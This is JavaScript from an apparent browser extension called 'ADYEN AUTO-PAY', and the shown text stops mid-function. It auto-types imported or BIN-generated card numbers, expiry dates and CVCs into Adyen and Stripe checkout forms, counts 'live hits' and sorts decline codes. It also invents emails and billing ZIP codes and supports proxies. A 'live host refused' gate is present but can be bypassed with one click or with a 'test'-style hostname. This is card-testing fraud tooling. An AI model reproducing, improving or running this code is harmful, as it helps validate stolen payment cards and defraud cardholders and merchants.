"use strict";

(function () {
  if (window.__nonoArmed) return;
  window.__nonoArmed = true;

  const cfgKey = "adyenPayload";
  const frameId = "f" + Math.random().toString(36).slice(2, 9);
  const isTop = window.self === window.top;
  let running = false;
  let stopRequested = false;
  let tries = 0;
  let liveHits = 0;
  let currentTick = "";
  let pendingCard = null;
  let capturedResps = [];
  let modalStarted = false;
  let hostOk = false;
  let autoScheduled = false;
  let importedCombos = [];
  let currentComboIndex = 0;
  let cardSourceMode = null;
  const combosKey = "adyenCombos";
  let comboListEl = null;
  let logBuffer = [];

  function pushLog(text) {
    const line = "[" + new Date().toTimeString().slice(0, 8) + "] " + text;
    logBuffer.push(line);
    if (logBuffer.length > 1000) logBuffer.splice(0, logBuffer.length - 1000);
  }

  function fallbackCopy(text) {
    try {
      const ta = document.createElement("textarea");
      ta.value = text;
      ta.style.position = "fixed";
      ta.style.opacity = "0";
      document.body.appendChild(ta);
      ta.select();
      document.execCommand("copy");
      document.body.removeChild(ta);
    } catch (e) {}
  }

  function copyLog() {
    const text = logBuffer.join("\n");
    const ok = () => window.__nonoLog && window.__nonoLog("Log copied (" + logBuffer.length + " lines). Paste it back to me.");
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(ok).catch(() => { fallbackCopy(text); ok(); });
    } else {
      fallbackCopy(text);
      ok();
    }
  }

  function saveCombos() {
    try {
      chrome.storage.local.set({ [combosKey]: { combos: importedCombos, index: currentComboIndex } });
    } catch (e) {}
  }

  function loadCombos() {
    return new Promise((resolve) => {
      try {
        chrome.storage.local.get([combosKey], (res) => {
          const data = res[combosKey];
          if (data && data.combos && Array.isArray(data.combos)) {
            importedCombos = data.combos;
            currentComboIndex = data.index || 0;
          }
          resolve();
        });
      } catch (e) {
        resolve();
      }
    });
  }

  function updateComboList() {
    if (!comboListEl) return;
    if (importedCombos.length === 0) {
      comboListEl.style.display = "none";
      return;
    }
    comboListEl.style.display = "block";
    comboListEl.innerHTML = "";
    importedCombos.forEach((combo, idx) => {
      const item = document.createElement("div");
      item.style.cssText = "padding:4px 6px;border-bottom:1px solid #141c26;color:" +
        (idx === currentComboIndex ? "#00d1b2" : "#8fa3b5") + ";display:flex;justify-content:space-between;align-items:center;cursor:pointer";
      const masked = combo.number.slice(0, 6) + "..." + combo.number.slice(-4);
      item.innerHTML = '<span>' + masked + ' | ' + combo.month + '/' + combo.year.slice(-2) + '</span>' +
        '<span style="font-size:9px;color:#46566a">' + (idx === currentComboIndex ? '▶' : '') + '</span>';
      item.addEventListener("click", () => {
        currentComboIndex = idx;
        saveCombos();
        updateComboList();
      });
      comboListEl.appendChild(item);
    });
  }

  const VERSION = "1.12.9";

  function gateSessionUrl(rawUrl, lab) {
    const u = String(rawUrl || "");
    if (lab) return { ok: true, reason: "lab" };
    if (/clientKey=live_/i.test(u)) return { ok: false, reason: "live clientKey refused" };
    if (/--data-raw[\s\S]{0,400}clientKey[:\\" ]+live_/i.test(u)) return { ok: false, reason: "live clientKey refused" };
    if (/(https?:\/\/[^\/\s]*)?checkoutshopper-live\.adyen\.com/i.test(u)) return { ok: false, reason: "live adyen host refused" };
    if (/(https?:\/\/[^\/\s]*)?checkoutshopper\.adyen\.com(\/|$)/i.test(u)) return { ok: false, reason: "live adyen host refused" };
    return { ok: true, reason: "ok" };
  }

  function getLab() {
    return new Promise((resolve) => {
      chrome.storage.local.get("nonoLab", (r) => {
        resolve(!!(r.nonoLab && r.nonoLab.enabled));
      });
    });
  }

  function isPrivateHost(u) {
    let host = "";
    try { host = new URL(String(u)).hostname; } catch (e) { return false; }
    if (host === "localhost" || host === "127.0.0.1" || host === "::1") return true;
    if (/^10\./.test(host)) return true;
    if (/^192\.168\./.test(host)) return true;
    if (/^172\.(1[6-9]|2\d|3[01])\./.test(host)) return true;
    return false;
  }

  function hostAllowed(u, lab) {
    const h = String(u || "").toLowerCase();
    if (lab) return true;
    if (/(^|\.)adyen\.(com|link)/.test(h)) {
      return lab || /checkoutshopper-test\.adyen\.com/.test(h);
    }
    if (/(^|\.)stripe\.(com|network)/.test(h)) return true;
    if (isPrivateHost(h)) return true;
    let host = "";
    try { host = new URL(h).hostname; } catch (e) { return false; }
    const parts = [];
    host.split(".").forEach((label) => parts.push.apply(parts, label.split("-")));
    const set = new Set(parts.map((p) => p.trim()).filter(Boolean));
    for (const t of ["localhost", "sandbox", "test", "dev", "stage", "staging", "qa", "demo", "mock", "sim", "lab"]) {
      if (set.has(t)) return true;
    }
    return false;
  }

  function looksAdyenish(u) {
    const h = String(u || "").toLowerCase();
    return /adyen|checkoutshopper/.test(h);
  }

  function removeBlockedNotice() {
    const b = document.getElementById("nono-blocked");
    if (b) b.remove();
  }

  function buildBlockedNotice() {
    if (document.getElementById("nono-blocked")) return;
    const box = document.createElement("div");
    box.id = "nono-blocked";
    box.style.cssText = [
      "position:fixed", "top:10px", "right:10px", "z-index:2147483647",
      "width:min(300px, calc(100vw - 20px))", "background:#2a1216",
      "color:#ffd9d9", "font-family:Segoe UI, Roboto, sans-serif",
      "border:1px solid #6e2830", "border-radius:12px", "padding:12px 14px",
      "font-size:12px", "box-shadow:0 12px 36px rgba(0,0,0,.55)",
      "display:flex", "flex-direction:column", "gap:8px"
    ].join(";");
    box.innerHTML =
      '<div style="font-weight:700;font-size:11px;letter-spacing:.6px;text-transform:uppercase;color:#ff7d7d">&#128308; ADYEN AUTO-PAY — BLOCKED</div>' +
      '<div style="color:#ffd9d9;line-height:1.5">This page looks like a live Adyen host, so the panel is kept off by default.<br>' +
      'Sandbox sim that mirrors live URLs? Hit the button and it stays on.</div>' +
      '<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">' +
      '<button id="nono-blocked-enable" style="background:#00a88c;color:#00110d;border:none;border-radius:7px;padding:8px 12px;font-size:11px;font-weight:800;cursor:pointer">&#10003; Enable now — it\'s my sandbox sim</button>' +
      '<button id="nono-blocked-open" style="background:#7d3a3a;color:#fff;border:none;border-radius:7px;padding:8px 10px;font-size:11px;font-weight:700;cursor:pointer">Options</button>' +
      '<button id="nono-blocked-dismiss" style="background:none;border:none;color:#aaa;cursor:pointer;font-size:11px">Dismiss</button>' +
      '</div>';
    document.body.appendChild(box);
    const enable = box.querySelector("#nono-blocked-enable");
    if (enable) {
      enable.addEventListener("click", () => {
        chrome.storage.local.set({ nonoLab: { enabled: true } }, () => {
          try {
            const info = box.querySelector("div");
            if (info) info.textContent = "Lab mode ON — sandbox sim recognized. Panel is appearing…";
          } catch (e) {}
          reevaluate();
        });
      });
    }
    const dismiss = box.querySelector("#nono-blocked-dismiss");
    if (dismiss) {
      dismiss.addEventListener("click", () => removeBlockedNotice());
    }
    const open = box.querySelector("#nono-blocked-open");
    if (open) {
      open.addEventListener("click", () => {
        try { chrome.runtime.openOptionsPage(); } catch (e) {}
      });
    }
  }

  function defaultBrowserInfo() {
    return {
      acceptHeader: "*/*",
      javaEnabled: false,
      colorDepth: (window.screen && window.screen.colorDepth) || 24,
      language: (navigator.language) || "en-GB",
      screenHeight: (window.screen && window.screen.height) || 832,
      screenWidth: (window.screen && window.screen.width) || 384,
      userAgent: navigator.userAgent || "",
      timeZoneOffset: -new Date().getTimezoneOffset()
    };
  }

  function parseCheckshopper(text) {
    const raw = String(text || "").trim();
    if (!raw) return null;

    const urlMatch = raw.match(/https?:\/\/[^\s'"\)]+/);
    let bodyText = "";

    const dm = raw.match(/--data-raw\s+\$?'?((?:[^'\\]|\\.)+)'?/);
    if (dm) {
      bodyText = dm[1]
        .replace(/\\'/g, "'")
        .replace(/\\\\/g, "\\")
        .replace(/\\n/g, "")
        .replace(/\\r/g, "")
        .replace(/\\t/g, "");
    } else if (/^[\[{]/.test(raw.trim())) {
      bodyText = raw.trim();
    } else {
      try {
        const j = JSON.parse(raw);
        if (j && typeof j === "object") bodyText = raw;
      } catch (e) {}
    }

    let body = null;
    if (bodyText) {
      try { body = JSON.parse(bodyText); } catch (e) {}
    }

    if (!urlMatch) {
      if (body && body.sessionData) {
        return {
          payUrl: "", sessionId: "", clientKey: "",
          sessionData: body.sessionData, browserInfo: body.browserInfo || null
        };
      }
      return null;
    }

    let u;
    try { u = new URL(urlMatch[0]); } catch (e) { return null; }

    const origin = u.origin;
    const path = u.pathname;
    const clientKey = u.searchParams.get("clientKey") || (body && body.clientKey) || "";
    const sm = path.match(/\/sessions\/([A-Za-z0-9_-]+)/);
    const sessionId = sm ? sm[1] : "";

    let payUrl = "";
    if (/\/payments(\?|$)/.test(path)) {
      payUrl = u.href;
    } else if (sessionId) {
      payUrl = origin + "/checkoutshopper/v1/sessions/" + sessionId + "/payments" +
        (clientKey ? "?clientKey=" + encodeURIComponent(clientKey) : "");
    } else {
      payUrl = origin + "/checkoutshopper/v1/payments";
    }

    return {
      payUrl: payUrl,
      sessionId: sessionId,
      clientKey: clientKey,
      sessionData: (body && body.sessionData) || "",
      browserInfo: (body && body.browserInfo) || null,
      origin: origin
    };
  }

  function injectHook() {
    try {
      chrome.runtime.sendMessage({ action: "FF_HOOK" }, () => {});
    } catch (e) {}
  }

  function attachCapture() {
    try {
      chrome.runtime.sendMessage({ action: "DBG_ATTACH" }, () => {});
    } catch (e) {}
  }

  function detachCapture() {
    try {
      chrome.runtime.sendMessage({ action: "DBG_DETACH" }, () => {});
    } catch (e) {}
  }

  function proxyMsg(payload) {
    return new Promise((resolve) => {
      try {
        chrome.runtime.sendMessage(payload, (res) => {
          if (chrome.runtime.lastError || !res) resolve({ ok: false, proxy: null });
          else resolve(res);
        });
      } catch (e) {
        resolve({ ok: false, proxy: null });
      }
    });
  }

  async function refreshProxyStatus() {
    const s = await proxyMsg({ action: "PROXY_STATUS" });
    const el = document.getElementById("nono-proxy-label");
    if (!el) return;
    el.textContent = "Proxy: " + (s && s.label ? s.label : "OFF");
  }

  document.addEventListener("nonnho-capture", (e) => {
    const d = e.detail || {};
    if (!d || !d.body) return;
    capturedResps.push({ at: Date.now(), url: d.url || "", status: d.status, body: String(d.body) });
    if (capturedResps.length > 60) capturedResps.shift();
    if (window.__nonoInbuiltScan) {
      const t = (d.url || "").toLowerCase();
      if (t.indexOf("sessions") !== -1 && t.indexOf("setup") !== -1) {
        try { clearTimeout(window.__nonoInbuiltTimer); } catch (x) {}
        window.__nonoInbuiltTimer = setTimeout(() => window.__nonoInbuiltScan(), 400);
      }
    }
  });

  function parseAdyenResp(body) {
    try {
      const j = JSON.parse(body);
      if (!j || typeof j !== "object") return null;
      const out = {};
      out.resultCode = j.resultCode || "";
      out.refusalReason = j.refusalReason || "";
      out.refusalCode = j.refusalReasonCode || "";
      out.psp = j.pspReference || "";
      out.action = (j.action && j.action.type) || "";
      if (out.resultCode || out.refusalReason || out.action) return out;
      return null;
    } catch (e) {
      return null;
    }
  }

  function parseStripeResp(body) {
    try {
      const j = JSON.parse(body);
      if (!j || typeof j !== "object") return null;
      const err = j.error || null;
      const lpe = j.last_payment_error || (j.payment_intent && j.payment_intent.last_payment_error) || (j.intent && j.intent.last_payment_error) || null;
      const pi = j.payment_intent || j.intent || (j.object === "payment_intent" ? j : null) || null;
      const si = pi ? null : (j.setup_intent || (j.object === "setup_intent" ? j : null) || null);
      const out = {};
      out.message = (err && err.message) || (lpe && lpe.message) || "";
      out.decline = (err && err.decline_code) || (lpe && lpe.decline_code) || "";
      out.code = (err && err.code) || (lpe && lpe.code) || "";
      out.status = (pi && pi.status) || (si && si.status) || j.status || "";
      out.action = (pi && pi.next_action && pi.next_action.type) || (si && si.next_action && si.next_action.type) || "";
      out.redirect = (pi && pi.next_action && pi.next_action.redirect_to_url && pi.next_action.redirect_to_url.url) || "";
      if (!out.message && !out.decline && !out.code && !out.status && !out.action && !out.redirect) return null;
      return out;
    } catch (e) {
      return null;
    }
  }

  function stripeVerdict(info) {
    if (!info) return null;
    const status = (info.status || "").toLowerCase();
    const action = (info.action || "").toLowerCase();
    if (info.decline || info.code) return { ok: false, label: "DECLINED " + (info.decline || info.code) + (info.message ? " | " + info.message : "") };
    if (/^succeeded$|^processing$/.test(status)) return { ok: true, label: (info.message || status.toUpperCase()) };
    if (action === "redirect_to_url" || info.redirect) return { ok: true, label: "REDIRECT" };
    if (/requires_action|await_payment_method/.test(status) || /requires_action|3ds|challenge/.test(action)) return { ok: true, label: "3DS CHALLENGE" };
    if (/requires_payment_method|requires_capture/.test(status) && !/error|declin/.test(status)) {
      return { ok: /requires_capture/.test(status), label: (/requires_capture/.test(status) ? "REQUIRES_CAPTURE" : "DECLINED (SOFT)") };
    }
    if (/canceled|cancelled|requires_confirmation/.test(status)) return { ok: false, label: "CANCELED" };
    if (info.message) return { ok: /succeed|success|process|approve|verified|complete/.test(info.message.toLowerCase()), label: info.message.trim() };
    return null;
  }

  function randomEmail() {
    const d = "gmail.com";
    return "us" + Math.floor(1000 + Math.random() * 9000) + new Date().getTime().toString().slice(-3) + "@" + d;
  }

  let signalCache = { adyenAt: 0, adyen: false, stripeAt: 0, stripe: false };
  function stripeUISignal() {
    const now = Date.now();
    if (now - signalCache.stripeAt < 500) return signalCache.stripe;
    signalCache.stripeAt = now;
    signalCache.stripe = (function () {
      if (/(^|\.)stripe\.(com|network)/.test(location.hostname)) return true;
      try {
        const f = Array.from(document.querySelectorAll("iframe")).some((x) =>
          /stripe\.(com|network)/.test(x.src || "") || (x.name || "").indexOf("__privateStripeFrame") === 0
        );
        if (f) return true;
        const html = document.documentElement ? document.documentElement.innerHTML : "";
        if (/__privateStripeFrame|payment-element|stripe-form|hosted-payment-sheet|data-testid=["']card/.test(html)) return true;
      } catch (e) {}
      return false;
    })();
    return signalCache.stripe;
  }

  function lastRespSince(ts) {
    for (let i = capturedResps.length - 1; i >= 0; i--) {
      if (capturedResps[i].at >= ts) return capturedResps[i];
    }
    return null;
  }

  function findInbuiltFromCaptured() {
    for (let i = capturedResps.length - 1; i >= 0; i--) {
      const rec = capturedResps[i];
      const u = String(rec.url || "");
      if (!/\/sessions(\/|$)/.test(u)) continue;
      let body = null;
      try { body = JSON.parse(rec.body); } catch (e) {}
      if (!body || typeof body !== "object") continue;
      const sd = body.sessionData || (body.session && body.session.sessionData) || "";
      if (!sd) continue;
      const sm = u.match(/\/sessions\/([A-Za-z0-9_-]+)/);
      const sessionId = sm ? sm[1] : "";
      let clientKey = "";
      try { clientKey = new URL(u).searchParams.get("clientKey") || ""; } catch (e) {}
      clientKey = clientKey || body.clientKey || "";
      let origin = "";
      try { origin = new URL(u).origin; } catch (e) {}
      const payUrl = origin
        ? (sessionId
            ? origin + "/checkoutshopper/v1/sessions/" + sessionId + "/payments" +
              (clientKey ? "?clientKey=" + encodeURIComponent(clientKey) : "")
            : origin + "/checkoutshopper/v1/payments")
        : u;
      return {
        sessionId: sessionId,
        clientKey: clientKey,
        sessionData: sd,
        browserInfo: body.browserInfo || null,
        payUrl: payUrl,
        origin: origin,
        rawUrl: u
      };
    }
    return null;
  }

  async function extractInbuiltSession() {
    const local = findInbuiltFromCaptured();
    if (local) return Object.assign(local, {
      payUrl: local.payUrl || local.rawUrl || ""
    });
    const g = await proxyMsg({ action: "INBUILT_SESSION" });
    if (g && g.found) {
      return {
        sessionId: g.sessionId || "",
        clientKey: g.clientKey || "",
        sessionData: g.sessionData || "",
        browserInfo: null,
        payUrl: g.payUrl || "",
        origin: g.origin || "",
        rawUrl: g.rawUrl || g.payUrl || ""
      };
    }
    return null;
  }

  function getConfig() {
    return new Promise((resolve) => {
      chrome.storage.local.get([cfgKey], (res) => {
        resolve(res[cfgKey] || null);
      });
    });
  }

  function setConfig(cfg) {
    return new Promise((resolve) => {
      chrome.storage.local.set({ [cfgKey]: cfg }, resolve);
    });
  }

  const DEFAULT_ZIPS = {
    US: "10001", GB: "SW1A 1AA", AE: "00000", CA: "K1A 0B1", AU: "2000",
    DE: "10115", FR: "75001", SA: "11564", EG: "11511", IN: "110001",
    MY: "50000", SG: "018906", NL: "1011", IT: "00100", ES: "28001",
    SE: "111 57", CH: "8001", AT: "1010", BE: "1000", TR: "34418",
    KW: "00000", QA: "00000", BH: "00000", OM: "00000", JO: "11118",
    LB: "00000", IQ: "00000", IL: "00000", PK: "75500", BD: "1000",
    ID: "10110", TH: "10210", VN: "70000", PH: "1000", JP: "100-0001",
    KR: "04524", HK: "00000", TW: "100", NZ: "1010", IE: "D01 F5R2",
    ZA: "8001", NG: "100001", KE: "00100", BR: "01310-100", MX: "01000",
    AR: "C1000AAF", CL: "8320000", CO: "110111", PE: "15001", RU: "101000",
    UA: "01001", PL: "00-001", CZ: "110 00", SK: "811 01", HU: "1051",
    RO: "010011", BG: "1000", GR: "104 31", PT: "1100-320", DK: "1000",
    NO: "0150", FI: "00100", IS: "101", HR: "10000", RS: "11000",
    EE: "10111", LT: "01131", LV: "LV-1050", CY: "1016", MT: "VLT 1111",
    LU: "L-1111", MC: "98000", AD: "AD500", SM: "47890", SO: "00000",
    SD: "00000", YE: "00000", PS: "00000", AM: "0000", GE: "0100",
    AZ: "AZ1000", KZ: "010000", BY: "220030", MD: "2001", AL: "1001",
    MK: "1000", BA: "71000", ME: "81000", XK: "10000"
  };

  function normalizeCountry(c) {
    return String(c || "").trim().toUpperCase().slice(0, 2);
  }

  function defaultZipFor(country) {
    return DEFAULT_ZIPS[normalizeCountry(country)] || DEFAULT_ZIPS.US;
  }

  function isCountrySelect(el) {
    if (!el || el.tagName !== "SELECT") return false;
    const s = (el.id + " " + el.name + " " + (el.getAttribute("aria-label") || "") + " " +
      (el.getAttribute("data-elements-stable-field-name") || "") + " " +
      (el.getAttribute("autocomplete") || "") + " " + String(el.className || "")).toLowerCase();
    if (!/(^|[^a-z0-9])(country|billingcountry|addresscountry)/i.test(s)) return false;
    const opts = Array.from(el.options || []);
    return opts.some((o) => /^[A-Z]{2}$/.test((o.value || o.text || "").trim()));
  }

  function resolveMode(cfg) {
    if (cardSourceMode === "bin" || cardSourceMode === "combo") return cardSourceMode;
    if (cfg && (cfg.mode === "bin" || cfg.mode === "combo")) return cfg.mode;
    if ((cfg && cfg.combo) || importedCombos.length > 0) return "combo";
    return "bin";
  }

  function hasCardSource(cfg) {
    if (resolveMode(cfg) === "combo") return !!(cfg && cfg.combo) || importedCombos.length > 0;
    return !!(cfg && cfg.bin);
  }

  function applyCardMode(mode) {
    cardSourceMode = mode === "bin" ? "bin" : "combo";
    const isBin = cardSourceMode === "bin";
    const ids = { bin: "nono-bin", len: "nono-len", combo: "nono-combo", fileIn: "nono-file-input" };
    const set = (id, disabled) => { const e = document.getElementById(id); if (e) e.disabled = disabled; };
    set(ids.bin, !isBin);
    set(ids.len, !isBin);
    set(ids.combo, isBin);
    set(ids.fileIn, isBin);
    const dim = (id) => { const e = document.getElementById(id); if (e) e.style.opacity = isBin ? "0.35" : "1"; };
    dim("nono-upload-btn");
    dim("nono-clear-combos");
    dim("nono-combo-count");
    dim("nono-combo-list");
    dim("nono-combo-wrap");
    dim("nono-file-wrap");
    const mb = document.getElementById("nono-mode-bin");
    const mc = document.getElementById("nono-mode-combo");
    if (mb) { mb.style.background = isBin ? "#00d1b2" : "#23303c"; mb.style.color = isBin ? "#00110d" : "#e6e6e6"; mb.style.fontWeight = isBin ? "800" : "700"; }
    if (mc) { mc.style.background = isBin ? "#23303c" : "#00d1b2"; mc.style.color = isBin ? "#e6e6e6" : "#00110d"; mc.style.fontWeight = isBin ? "700" : "800"; }
  }

  function paymentRelevant() {
    const u = location.href;
    if (/checkoutshopper|\.adyen\.(com|link)|(^|[./])(buy|checkout|pay|js)\.stripe\.com|stripe\.network/i.test(u)) return true;
    try {
      return !!document.querySelector("iframe[src*='stripe.com'], iframe[src*='adyen.com'], input[data-elements-stable-field-name], input[autocomplete='cc-number'], input[autocomplete='cc-exp'], select[name*='country']");
    } catch (e) {
      return false;
    }
  }

  function panelActive() {
    return !!document.getElementById("nono-panel");
  }

  function setNativeValue(el, value) {
    const proto = el instanceof HTMLTextAreaElement
      ? HTMLTextAreaElement.prototype
      : el instanceof HTMLSelectElement
        ? HTMLSelectElement.prototype
        : HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, "value");
    if (!desc) return;
    desc.set.call(el, value);
    el.dispatchEvent(new Event("input", { bubbles: true }));
    el.dispatchEvent(new Event("change", { bubbles: true }));
    el.dispatchEvent(new Event("blur", { bubbles: true }));
  }

  function typeValue(el, value) {
    const proto = el instanceof HTMLTextAreaElement
      ? HTMLTextAreaElement.prototype
      : HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, "value");
    if (!desc) return;
    desc.set.call(el, "");
    try {
      el.dispatchEvent(new InputEvent("input", { bubbles: true, inputType: "deleteContentBackward" }));
    } catch (e) {}
    const str = String(value);
    for (let i = 0; i < str.length; i++) {
      const ch = str[i];
      desc.set.call(el, el.value + ch);
      try {
        el.dispatchEvent(new KeyboardEvent("keydown", { bubbles: true, cancelable: true, key: ch }));
        el.dispatchEvent(new KeyboardEvent("keypress", { bubbles: true, cancelable: true, key: ch }));
        el.dispatchEvent(new InputEvent("beforeinput", { bubbles: true, cancelable: true, inputType: "insertText", data: ch }));
        el.dispatchEvent(new InputEvent("input", { bubbles: true, inputType: "insertText", data: ch }));
        el.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true, cancelable: true, key: ch }));
      } catch (e) {
        el.dispatchEvent(new Event("input", { bubbles: true }));
      }
    }
    try {
      el.dispatchEvent(new InputEvent("input", { bubbles: true }));
    } catch (e) {}
    el.dispatchEvent(new Event("change", { bubbles: true }));
    el.dispatchEvent(new Event("blur", { bubbles: true }));
    el.dispatchEvent(new FocusEvent("focusout", { bubbles: true }));
  }

  function classifyField(el) {
    const s = ((el.id || "") + " " + (el.name || "") + " " +
      (el.getAttribute("aria-label") || "") + " " +
      (el.getAttribute("placeholder") || "") + " " +
      (el.getAttribute("data-fieldtype") || "") + " " +
      (el.getAttribute("data-elements-stable-field-name") || "") + " " +
      (el.getAttribute("autocomplete") || "") + " " +
      (typeof el.className === "string" ? el.className : "")).toLowerCase();
    if (/(^|[^a-z0-9])(card\s*[-_]?\s*number|cardnumber|cc[-_ ]?number|ccnum|pan|enter your card number|encrypted\w*(number|pan))/i.test(s)) return "number";
    if (/(^|[^a-z0-9])(cc[-_]?exp[-_]?month|exp[-_]?month|expir(?:y|ation)[-_ ]*month|cardexpir(?:y|ation)?[-_]?month|expmonth|encrypted\w*month)/i.test(s)) return "month";
    if (/(^|[^a-z0-9])(cc[-_]?exp[-_]?year|exp[-_]?year|expir(?:y|ation)[-_ ]*year|cardexpir(?:y|ation)?[-_]?year|expyear|encrypted\w*year)/i.test(s)) return "year";
    if (/(^|[^a-z0-9])(cc[-_]?exp|exp[-_ ]?date|expdate|cardexpir(?:y|ation)?|expir(?:y|ation)([ -]?date)?|expiration\s*(date)?)/i.test(s)) return "expiry";
    if (/(^|[^a-z0-9])(cvc|cvv|csc|security[-_\s]*(code)?|cardcvc|cardcid|encryptedcvc)/i.test(s)) return "cvc";
    if (/(^|[^a-z0-9])(postal[-_\s]*(code)?|zip[-_\s]*code|zipcode|zip|postalcode|cc-zip)/i.test(s)) return "postal";
    if (/(^|[^a-z0-9])(cardholder|holder[-_\s]*name|cc[-_ ]name|name[-_\s]*on[-_\s]*card|card[-_\s]*holder)/i.test(s)) return "holder";
    if (/(^|[^a-z0-9])(mail|email|e-mail)/i.test(s)) return "email";
    return null;
  }

  function fillOwned(card) {
    const fields = { number: false, month: false, year: false, cvc: false, expiry: false, postal: false, holder: false, email: false };
    let any = false;

    let effectiveCountry = normalizeCountry(card.country);
    let countrySel = null;
    const selects = Array.from(document.querySelectorAll("select"));
    for (const sel of selects) {
      if (!isCountrySelect(sel)) continue;
      if (!countrySel) countrySel = sel;
      const cur = normalizeCountry(sel.value || "");
      if (!effectiveCountry && /^[A-Z]{2}$/.test(cur)) effectiveCountry = cur;
    }
    if (countrySel && effectiveCountry) {
      const want = effectiveCountry;
      const opt = Array.from(countrySel.options || []).find((o) => {
        const v = String(o.value || o.text || "").trim().toUpperCase();
        return /^[A-Z]{2}$/.test(v) && v === want;
      });
      if (opt && String(countrySel.value || "").trim().toUpperCase() !== want) {
        setNativeValue(countrySel, opt.value);
      }
    }
    effectiveCountry = effectiveCountry || "US";
    const fallbackZip = card.postal || card.zip || defaultZipFor(effectiveCountry);

    const inputs = Array.from(document.querySelectorAll("input"));
    for (const inp of inputs) {
      if (inp.type === "hidden") continue;
      const kind = classifyField(inp);
      if (!kind) continue;
      if (kind === "number" && !fields.number) {
        typeValue(inp, card.number || "");
        fields.number = true; any = true;
      } else if (kind === "expiry" && !fields.expiry && !fields.month && !fields.year) {
        typeValue(inp, String(card.month || card.expiryMonth || "12").padStart(2, "0") + "/" +
          String(card.year || card.expiryYear || "2029").slice(-2));
        fields.expiry = true; fields.month = true; fields.year = true; any = true;
      } else if (kind === "month" && !fields.month) {
        typeValue(inp, String(card.month || card.expiryMonth || "12").padStart(2, "0"));
        fields.month = true; any = true;
      } else if (kind === "year" && !fields.year) {
        typeValue(inp, String(card.year || card.expiryYear || "2029").slice(-2));
        fields.year = true; any = true;
      } else if (kind === "cvc" && !fields.cvc) {
        typeValue(inp, card.cvc || "");
        fields.cvc = true; any = true;
      } else if (kind === "postal" && !fields.postal && fallbackZip) {
        typeValue(inp, fallbackZip);
        fields.postal = true; any = true;
      } else if (kind === "holder" && !fields.holder) {
        setNativeValue(inp, card.holder || "JOHN DOE");
        fields.holder = true;
      } else if (kind === "email" && !fields.email) {
        const maybeEmail = card.holder && /@/.test(card.holder) ? card.holder : (card.email || "");
        if (maybeEmail) setNativeValue(inp, maybeEmail);
        fields.email = true;
      }
    }

    if (!fields.number) {
      const n = document.querySelector('input[autocomplete="cc-number"], input[name*="cardnumber" i], input[id*="cardnumber" i], input[data-elements-stable-field-name="cardNumber"]');
      if (n) { typeValue(n, card.number || ""); fields.number = true; any = true; }
    }
    if (!fields.month && !fields.year && !fields.expiry) {
      const e = document.querySelector('input[autocomplete="cc-exp"], input[name*="expiry" i], input[id*="expiry" i], input[name="exp-date"], input[data-elements-stable-field-name="cardExpiry"]');
      if (e) {
        typeValue(e, String(card.month || card.expiryMonth || "12").padStart(2, "0") + "/" +
          String(card.year || card.expiryYear || "2029").slice(-2));
        fields.month = true; fields.year = true; fields.expiry = true; any = true;
      }
    }
    if (!fields.cvc) {
      const c = document.querySelector('input[autocomplete="cc-csc"], input[autocomplete="cc-cvc"], input[name*="securityCode"], input[name="cvc"], input[data-elements-stable-field-name="cardCvc"]');
      if (c) { typeValue(c, card.cvc || ""); fields.cvc = true; any = true; }
    }
    if (!fields.postal && fallbackZip) {
      const p = document.querySelector('input[autocomplete="postal-code"], input[name="postal"], input[name="zip"], input[id*="postal" i], input[data-elements-stable-field-name="postalCode"]');
      if (p) { typeValue(p, fallbackZip); fields.postal = true; any = true; }
    }

    if (!fields.holder) {
      const holder = document.querySelector('input[name*="holder"], input[id*="holder"], input[autocomplete="cc-name"]');
      if (holder) setNativeValue(holder, card.holder || "JOHN DOE");
    }

    if (!fields.email) {
      const email = document.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
      const maybeEmail = card.holder && /@/.test(card.holder) ? card.holder : (card.email || "");
      if (email && maybeEmail) setNativeValue(email, maybeEmail);
    }

    return { fields, any };
  }

  function frameReportKey(pref, id) {
    return pref + "_" + id;
  }

  function report(pref, obj) {
    chrome.storage.local.set({ [frameReportKey(pref, frameId)]: obj });
  }

  function clearReports(pref) {
    chrome.storage.local.get(null, (all) => {
      const toDel = Object.keys(all).filter((k) => k.indexOf(pref) === 0);
      if (toDel.length) chrome.storage.local.remove(toDel);
    });
  }

  function summarize(pref) {
    return new Promise((resolve) => {
      chrome.storage.local.get(null, (all) => {
        const agg = { number: false, month: false, year: false, cvc: false, expiry: false, postal: false, any: false, frames: 0, texts: [] };
        Object.keys(all).forEach((k) => {
          if (k.indexOf(pref) !== 0) return;
          const r = all[k];
          if (!r || r.tick === undefined || r.tick !== currentTick) return;
          agg.frames++;
          if (r.fields) {
            ["number", "month", "year", "cvc", "expiry", "postal"].forEach((f) => {
              if (r.fields[f]) agg[f] = true;
            });
            if (r.any) agg.any = true;
          }
          if (r.text) agg.texts.push(r.text);
        });
        resolve(agg);
      });
    });
  }

  function sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
  }

  async function waitReports(pref, minWait, maxWait) {
    const start = Date.now();
    let lastCount = -1;
    let lastChange = Date.now();
    await sleep(700);
    while (Date.now() - start < (maxWait || 7000)) {
      const s = await summarize(pref);
      if (s.frames > 0 && s.frames !== lastCount) {
        lastCount = s.frames;
        lastChange = Date.now();
      }
      if (s.frames > 0 && Date.now() - lastChange > 550) return s;
      if (Date.now() - start >= (minWait || 1800) && s.frames > 0) return s;
      await sleep(250);
    }
    return summarize(pref);
  }

  function execFill(card) {
    return new Promise((resolve) => {
      try {
        chrome.runtime.sendMessage({ action: "FF_EXEC", card: card }, (res) => {
          if (chrome.runtime.lastError || !res) {
            resolve({ any: false, fields: {}, error: chrome.runtime.lastError && chrome.runtime.lastError.message });
            return;
          }
          resolve(res);
        });
      } catch (e) {
        resolve({ any: false, fields: {}, error: String(e) });
      }
    });
  }

  chrome.storage.onChanged.addListener((changes, area) => {
    if (area !== "local") return;

    if (changes["nonoLab"]) {
      reevaluate();
      return;
    }

    const ff = changes["nono_ff"];
    if (ff && ff.newValue && ff.newValue.card) {
      currentTick = ff.newValue.tick;
      pendingCard = ff.newValue.card;
      const r = fillOwned(pendingCard);
      report("nono_ff", { tick: ff.newValue.tick, fields: r.fields, any: r.any });
      return;
    }

    const dt = changes["nono_detect"];
    if (dt && dt.newValue) {
      currentTick = dt.newValue.tick;
